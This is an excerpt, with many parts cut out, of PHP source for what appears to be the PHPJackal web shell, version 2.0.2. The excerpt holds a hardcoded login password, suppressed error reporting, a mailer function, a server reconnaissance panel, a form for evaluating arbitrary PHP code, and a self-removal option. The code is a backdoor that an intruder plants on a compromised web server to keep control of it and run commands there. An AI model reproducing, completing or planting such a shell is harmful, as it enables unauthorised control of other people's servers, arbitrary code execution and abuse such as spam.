...
#--Config--#
$login_password='hryycflqswslhh993';#Login password
$email='';
$IP=array();
#----------#
error_reporting(0);
...
$cwd=getcwd();
$VERSION='2.0.2';
$intro='<img src="" style="border: none; margin: 0;" /><br /><br />
<font color="red">
<pre>
...
function maileR(){
global $hcwd,$cwd;
echo '<img src="" style="border: none; margin: 0;" /><br /><br />';
...
echo '<img src="" style="border: none; margin: 0;" /><br /><br /><div class="fieldwrapper"><label class="styled" style="width:320px">Server information</label></div><div class="fieldwrapper"><label class="styled">Server:</label><div class="thefield"><span>'; if(!empty($_SERVER['SERVER_ADDR']))echo '<img src=""> ';echo '<a href="'.hlinK("seC=tools&serveR=whois.geektools.com&domaiN=".$_SERVER['HTTP_HOST']) .'">'.$_SERVER['HTTP_HOST'].'</a>';if(!empty($_SERVER['SERVER_ADDR'])){ echo '(<a href="'.hlinK("seC=tools&serveR=whois.geektools.com&domaiN=".$_SERVER['SERVER_ADDR']) .'">'.$_SERVER['SERVER_ADDR'].'</a>)';}echo '</span></div></div><div class="fieldwrapper"><label class="styled">Operation system:</label><div class="thefield"><span><a href="'.$os.$osver. '</span></div></div><div class="fieldwrapper"><label class="styled">Web server:</label><div class="thefield"><span>'.$_SERVER['SERVER_SOFTWARE']. '</span></div></div><div class="fieldwrapper"><label class="styled">CPU:</label><div class="thefield"><span>'.$CPU. '</span></div></div><div class="fieldwrapper"><label class="styled">Disk space:</label><span>
...
function phpevaL(){
global $hcwd;
echo '<img src="" style="border: none; margin: 0;" /><br /><br /><form class="form" method="POST">';
...
function phpjackal(){
	...
	echo '<img src="" style="border: none; margin: 0;" /><br /><br /><ul><li><a href="'.hlinK("seC=phpjackal&workingdiR=$cwd&chkveR=1").'">Check version</a></li><li><a href="#" onclick="if(confirm(\'Are you sure?\'))window.location=\''.hlinK("seC=phpjackal&workingdiR=$cwd&slfrmv=1").'\';">Self removal</a></li></ul>';
}
...
echo '<br /><a href="javascript: history.go(-1)"><img src="" /><b>Back</b></a>';
}
